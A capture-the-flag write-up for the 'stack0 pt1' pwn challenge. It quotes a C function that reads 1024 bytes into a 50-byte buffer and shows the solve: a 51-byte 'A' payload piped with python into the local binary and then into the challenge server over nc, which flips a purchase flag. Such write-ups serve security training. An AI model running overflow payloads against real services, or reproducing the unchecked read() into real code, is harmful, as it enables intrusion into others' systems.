# stack0 pt1
**Category:** Pwn

**Points:** 5

**Description:**

Author: C0deH4cker

Read the contents of flag1.txt.

nc ctf.hackucf.org 32101

> **Files:** stack0, stack0.c, libpwnableharness32.so

**Write-up**
This is a buffer overflow challenge, and the code file was provided.

First I tried just running the program:
```bash
> ./stack0
Debug info: Address of input buffer = 0xff862aed
Enter the name you used to purchase this program: fred
This program has not been purchased.
```

The buffer overflow is likely to be in the place the name is entered.

Looking at the code the important function seemed to be `handle_connection()` as it contains a `read()` call into a buffer of 50 chars:
```c
static void handle_connection(int sock) {
	bool didPurchase = false;
	char input[50];
	
	printf("Debug info: Address of input buffer = %p\n", input);
	
	printf("Enter the name you used to purchase this program: ");
	read(STDIN_FILENO, input, 1024);
	
	if(didPurchase) {
		printf("Thank you for purchasing Hackersoft Powersploit!\n");
		giveFlag();
	}
	else {
		printf("This program has not been purchased.\n");
	}
}
```

When the program runs it waits for input at this point, and overflowing the buffer may give a result. At first I tried overrunning by a single byte.
```bash
> python -c "print ('A' * 51)" | ./stack0
Debug info: Address of input buffer = 0xffa3892d
Enter the name you used to purchase this program: Thank you for purchasing Hackersoft Powersploit!
flag1.txt: No such file or directory
```

This shows the program is attempting to load the flag, so I ran it against the server:
```bash
> python -c "print('A' * 51)" | nc ctf.hackucf.org 32101
```

This worked, and gave me the flag.
